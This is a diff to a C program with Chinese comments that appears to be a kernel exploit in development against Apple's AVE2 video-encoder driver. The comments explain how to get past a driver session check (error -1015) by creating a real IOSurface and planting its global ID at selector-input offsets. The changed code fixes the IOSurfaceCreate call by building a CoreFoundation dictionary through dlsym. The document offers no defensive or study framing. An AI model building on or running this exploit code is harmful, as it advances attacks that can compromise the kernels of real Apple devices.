@@ -764,16 +764,38 @@ int main(void) {
            -1015 判据 = [driver_elem+0x28] == [session+0x3de0]; Start 输入 +0x28 = iUCInfoSID (>0).
            造一个真 IOSurface 拿全局 ID，然后 (a) sel5+0x28 := SID; (b) create 输入逐 offset := SID。 */
         {
-            typedef void *(*iosurf_create_fn)(void *, size_t, size_t *);
+            typedef void *(*iosurf_create_fn)(void *);  /* 真实签名 IOSurfaceCreate(CFDictionaryRef) */
             typedef uint32_t (*iosurf_id_fn)(void *);
             iosurf_create_fn isc = (iosurf_create_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
             iosurf_id_fn isg = (iosurf_id_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
             uint32_t SID = 0;
             if (isc != NULL && isg != NULL) {
-                size_t bpr = 0;
-                void *surf = isc(NULL, 4096, &bpr);
-                if (surf != NULL) { SID = isg(surf); printf("    [surf] IOSurface id=%u (0x%x) bpr=%zu\n", SID, SID, bpr); }
-                else printf("    [surf] IOSurfaceCreate returned NULL\n");
+                /* v48: 旧代码用假签名 isc(NULL,4096,&bpr) 传空属性字典, IOSurfaceCreate 必返 NULL。
+                   改用 dlsym 的 CF 函数造真字典: kIOSurfaceWidth/Height/BytesPerElement。 */
+                typedef void *(*cf_dict_mut_fn)(void *, long, const void *, const void *);
+                typedef void (*cf_setval_fn)(void *, const void *, const void *);
+                typedef void *(*cf_num_fn)(void *, long, const void *);
+                cf_dict_mut_fn cdm = (cf_dict_mut_fn)dlsym(RTLD_DEFAULT, "CFDictionaryCreateMutable");
+                cf_setval_fn csv = (cf_setval_fn)dlsym(RTLD_DEFAULT, "CFDictionarySetValue");
+                cf_num_fn cnum = (cf_num_fn)dlsym(RTLD_DEFAULT, "CFNumberCreate");
+                const void *str_cb = dlsym(RTLD_DEFAULT, "kCFCopyStringDictionaryKeyCallBacks");
+                const void *val_cb = dlsym(RTLD_DEFAULT, "kCFTypeDictionaryValueCallBacks");
+                const void **kw = (const void **)dlsym(RTLD_DEFAULT, "kIOSurfaceWidth");
+                const void **kh = (const void **)dlsym(RTLD_DEFAULT, "kIOSurfaceHeight");
+                const void **kbpe = (const void **)dlsym(RTLD_DEFAULT, "kIOSurfaceBytesPerElement");
+                if (cdm && csv && cnum && str_cb && val_cb && kw && kh && kbpe) {
+                    void *dict = cdm(NULL, 0, str_cb, val_cb);
+                    long long w = 1920, h = 1080, bpe = 1;   /* kCFNumberSInt64Type=4 */
+                    void *nw = cnum(NULL, 4, &w);
+                    void *nh = cnum(NULL, 4, &h);
+                    void *nb = cnum(NULL, 4, &bpe);
+                    if (dict && nw && nh && nb) {
+                        csv(dict, *kw, nw); csv(dict, *kh, nh); csv(dict, *kbpe, nb);
+                        void *surf = isc(dict);
+                        if (surf != NULL) { SID = isg(surf); printf("    [surf] IOSurface id=%u (0x%x) 1920x1080 bpe=1\n", SID, SID); }
+                        else printf("    [surf] IOSurfaceCreate(dict) returned NULL\n");
+                    } else printf("    [surf] CF alloc failed\n");
+                } else printf("    [surf] dlsym CF/kIOSurface failed\n");
             } else printf("    [surf] dlsym IOSurface failed\n");
             const char *ms = getenv("AVE2_MS_PATCH");
             if (SID != 0) {
